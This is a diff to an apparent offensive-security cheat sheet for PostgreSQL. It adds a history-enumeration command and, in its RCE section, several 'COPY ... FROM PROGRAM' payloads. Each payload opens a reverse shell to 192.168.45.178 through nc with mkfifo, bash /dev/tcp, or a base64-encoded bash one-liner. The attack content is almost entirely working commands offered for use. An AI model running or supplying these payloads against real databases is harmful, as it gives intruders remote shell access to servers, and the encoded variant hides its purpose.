@@ -10,6 +10,12 @@ psql -h <host> -U <username> -d <database> # Remote connection
 psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
 ```
 
+#### Enumeration
+
+```bash
+\s history
+```
+
 #### RCE
 
 ```bash
@@ -22,7 +28,9 @@ SELECT * FROM cmd_exec;
 DROP TABLE IF EXISTS cmd_exec;
 
 
-COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.178 443 >/tmp/f';
+COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.178 80 >/tmp/f';
+COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/192.168.45.178/10000 0>&1';
+COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzgvODAgMD4mMSAgICAg|base64 -d|bash'; # 80
 ```
 
 ```bash
